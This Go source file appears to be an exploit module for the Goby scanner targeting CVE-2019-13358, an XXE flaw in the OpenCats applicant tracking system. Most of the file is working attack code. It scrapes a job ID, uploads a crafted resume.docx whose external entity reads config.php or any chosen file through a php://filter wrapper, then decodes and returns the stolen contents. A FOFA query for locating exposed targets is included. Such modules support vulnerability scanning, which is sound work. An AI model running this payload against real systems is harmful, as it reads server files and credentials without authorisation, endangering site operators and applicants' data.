package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "OpenCats 9.4.2 XXE (CVE-2019-13358)",
    "Description": "<p>OpenCats is a leading free &amp; open applicant tracking system</p><p>lib/DocumentToText.php in OpenCats before 0.9.4-3 has XXE that allows remote users to read files on the underlying operating system. The attacker must upload a file in the docx or odt format.</p>",
    "Impact": "OpenCats 9.4.2 XXE (CVE-2019-13358)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/opencats/opencats\">https://github.com/opencats/opencats</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "OpenCats",
    "VulType": [
        "XML External Entity Injection"
    ],
    "Tags": [
        "XML External Entity Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "OpenCats 9.4.2 版本 XXE 漏洞（CVE-2019-13358）",
            "Description": "<p>OpenCats是领先的免费开放申请人跟踪系统</p><p>0.9.4-3 之前的 OpenCats 中的 lib/DocumentToText.php 具有 XXE，允许远程用户读取底层操作系统上的文件。攻击者必须上传 docx 或 odt 格式的文件。</p>",
            "Impact": "<p>0.9.4-3 之前的 OpenCats 中的 lib/DocumentToText.php 具有 XXE，允许远程用户读取底层操作系统上的文件。攻击者必须上传 docx 或 odt 格式的文件。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://github.com/opencats/opencats\">https://github.com/opencats/opencats</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "OpenCats",
            "VulType": [
                "XML外部实体注入"
            ],
            "Tags": [
                "XML外部实体注入"
            ]
        },
        "EN": {
            "Name": "OpenCats 9.4.2 XXE (CVE-2019-13358)",
            "Description": "<p>OpenCats is a leading free & open applicant tracking system</p><p>lib/DocumentToText.php in OpenCats before 0.9.4-3 has XXE that allows remote users to read files on the underlying operating system. The attacker must upload a file in the docx or odt format.</p>",
            "Impact": "OpenCats 9.4.2 XXE (CVE-2019-13358)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/opencats/opencats\">https://github.com/opencats/opencats</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "OpenCats",
            "VulType": [
                "XML External Entity Injection"
            ],
            "Tags": [
                "XML External Entity Injection"
            ]
        }
    },
    "FofaQuery": "(title=\"opencats Login\")",
    "GobyQuery": "(title=\"opencats Login\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://opencats.org",
    "DisclosureDate": "2021-09-22",
    "References": [
        "https://www.exploit-db.com/exploits/50316"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.0",
    "CVEIDs": [
        "CVE-2019-13358"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "php://filter/convert.base64-encode/resource=config.php",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "OpenCats"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10225"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Wordstarthex, err := hex.DecodeString("504B0304140000000000E05437530023B86B3A0700003A07000011000000")
			if err != nil {
				return false
			}
			Wordendhex, err := hex.DecodeString("504B01021400140000000000E05437530023B86B3A0700003A070000110000000000000000000000B68100000000776F72642F646F63756D656E742E786D6C504B050600000000010001003F000000690700000000")
			if err != nil {
				return false
			}
			uri1 := "/careers/index.php?m=careers&p=showAll"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					IDfind := regexp.MustCompile("&amp;ID=(.*?)\">").FindStringSubmatch(resp1.RawBody)
					uri2 := "/careers/index.php?m=careers&p=onApplyToJobOrder"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryEUTPcpptUlwBmr7W")
					cfg2.Data = fmt.Sprintf("------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"ID\"\r\n\r\n%s\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"candidateID\"\r\n\r\n-1\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"applyToJobSubAction\"\r\n\r\nresumeLoad\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"resumeFile\"; filename=\"resume.docx\"\r\nContent-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document\r\n\r\n%sword/document.xml<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n<!DOCTYPE root [<!ENTITY file SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>]>\r\n<w:document xmlns:wpc=\"http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas\" xmlns:mo=\"http://schemas.microsoft.com/office/mac/office/2008/main\" xmlns:mc=\"http://schemas.openxmlformats.org/markup-compatibility/2006\" xmlns:mv=\"urn:schemas-microsoft-com:mac:vml\" xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\" xmlns:m=\"http://schemas.openxmlformats.org/officeDocument/2006/math\" xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:wp14=\"http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing\" xmlns:wp=\"http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing\" xmlns:w10=\"urn:schemas-microsoft-com:office:word\" xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\" xmlns:w14=\"http://schemas.microsoft.com/office/word/2010/wordml\" xmlns:wpg=\"http://schemas.microsoft.com/office/word/2010/wordprocessingGroup\" xmlns:wpi=\"http://schemas.microsoft.com/office/word/2010/wordprocessingInk\" xmlns:wne=\"http://schemas.microsoft.com/office/word/2006/wordml\" xmlns:wps=\"http://schemas.microsoft.com/office/word/2010/wordprocessingShape\" mc:Ignorable=\"w14 wp14\">\r\n    <w:body>\r\n        <w:p>\r\n            <w:r>\r\n                <w:t>START&file;END</w:t>\r\n            </w:r>\r\n        </w:p>\r\n        <w:sectPr w:rsidR=\"00FC693F\" w:rsidRPr=\"0006063C\" w:rsidSect=\"00034616\">\r\n            <w:pgSz w:w=\"12240\" w:h=\"15840\"/>\r\n            <w:pgMar w:top=\"1440\" w:right=\"1800\" w:bottom=\"1440\" w:left=\"1800\" w:header=\"720\" w:footer=\"720\" w:gutter=\"0\"/>\r\n            <w:cols w:space=\"720\"/>\r\n            <w:docGrid w:linePitch=\"360\"/>\r\n        </w:sectPr>\r\n    </w:body>\r\n</w:document>%s\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"resumeContents\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"firstName\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"lastName\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nyanbtp65312@chacuo.net\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"emailconfirm\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"phoneHome\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"phoneCell\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"bestTimeToCall\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"address\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"city\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"state\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"zip\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"keySkills\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W--\r\n", IDfind[1], string(Wordstarthex), string(Wordendhex))
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "START") && strings.Contains(resp2.RawBody, "END")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			Wordstarthex, _ := hex.DecodeString("504B0304140000000000E05437530023B86B3A0700003A07000011000000")
			Wordendhex, _ := hex.DecodeString("504B01021400140000000000E05437530023B86B3A0700003A070000110000000000000000000000B68100000000776F72642F646F63756D656E742E786D6C504B050600000000010001003F000000690700000000")
			uri1 := "/careers/index.php?m=careers&p=showAll"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					IDfind := regexp.MustCompile("&amp;ID=(.*?)\">").FindStringSubmatch(resp1.RawBody)
					uri2 := "/careers/index.php?m=careers&p=onApplyToJobOrder"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryEUTPcpptUlwBmr7W")
					cfg2.Data = fmt.Sprintf("------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"ID\"\r\n\r\n%s\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"candidateID\"\r\n\r\n-1\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"applyToJobSubAction\"\r\n\r\nresumeLoad\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"resumeFile\"; filename=\"resume.docx\"\r\nContent-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document\r\n\r\n%sword/document.xml<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n<!DOCTYPE root [<!ENTITY file SYSTEM '%s'>]>\r\n<w:document xmlns:wpc=\"http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas\" xmlns:mo=\"http://schemas.microsoft.com/office/mac/office/2008/main\" xmlns:mc=\"http://schemas.openxmlformats.org/markup-compatibility/2006\" xmlns:mv=\"urn:schemas-microsoft-com:mac:vml\" xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\" xmlns:m=\"http://schemas.openxmlformats.org/officeDocument/2006/math\" xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:wp14=\"http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing\" xmlns:wp=\"http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing\" xmlns:w10=\"urn:schemas-microsoft-com:office:word\" xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\" xmlns:w14=\"http://schemas.microsoft.com/office/word/2010/wordml\" xmlns:wpg=\"http://schemas.microsoft.com/office/word/2010/wordprocessingGroup\" xmlns:wpi=\"http://schemas.microsoft.com/office/word/2010/wordprocessingInk\" xmlns:wne=\"http://schemas.microsoft.com/office/word/2006/wordml\" xmlns:wps=\"http://schemas.microsoft.com/office/word/2010/wordprocessingShape\" mc:Ignorable=\"w14 wp14\">\r\n    <w:body>\r\n        <w:p>\r\n            <w:r>\r\n                <w:t>START&file;END</w:t>\r\n            </w:r>\r\n        </w:p>\r\n        <w:sectPr w:rsidR=\"00FC693F\" w:rsidRPr=\"0006063C\" w:rsidSect=\"00034616\">\r\n            <w:pgSz w:w=\"12240\" w:h=\"15840\"/>\r\n            <w:pgMar w:top=\"1440\" w:right=\"1800\" w:bottom=\"1440\" w:left=\"1800\" w:header=\"720\" w:footer=\"720\" w:gutter=\"0\"/>\r\n            <w:cols w:space=\"720\"/>\r\n            <w:docGrid w:linePitch=\"360\"/>\r\n        </w:sectPr>\r\n    </w:body>\r\n</w:document>%s\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"resumeContents\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"firstName\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"lastName\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nyanbtp65312@chacuo.net\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"emailconfirm\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"phoneHome\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"phoneCell\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"bestTimeToCall\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"address\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"city\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"state\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"zip\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W\r\nContent-Disposition: form-data; name=\"keySkills\"\r\n\r\n\r\n------WebKitFormBoundaryEUTPcpptUlwBmr7W--\r\n", IDfind[1], string(Wordstarthex), cmd, string(Wordendhex))
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "START") && strings.Contains(resp2.RawBody, "END") {
							Filebody := regexp.MustCompile("START(.*?)END").FindStringSubmatch(resp2.RawBody)
							Base64body, _ := base64.StdEncoding.DecodeString(Filebody[1])
							expResult.Output = string(Base64body)
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}
